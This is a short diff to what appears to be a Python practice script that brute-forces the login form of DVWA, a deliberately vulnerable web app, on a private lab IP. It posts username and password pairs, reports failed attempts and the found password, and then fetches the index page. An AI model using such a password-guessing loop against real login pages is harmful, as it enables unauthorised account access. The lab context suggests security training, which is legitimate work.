@@ -39,14 +39,11 @@ try:
     data = {'username':username, 'password':password, "Login":'submit'}
     send_data_url = requests.post(url, data=data)
 
-    if "Login successful" in str(send_data_url.content):
-        cprint(requests.get(url = 'http://192.168.142.138/dvwa/index.php').text, 'blue')
-        
     if "Login failed" in str(send_data_url.content):
         cprint("[*] Attempting password: %s" % password, 'red')
     else:
         cprint("[*] Password found: %s " % password,'green')
-        
+        cprint(requests.get(url = 'http://192.168.142.138/dvwa/index.php').text, 'blue')
 
 except:
     cprint("There was an error, please try again..", 'red')
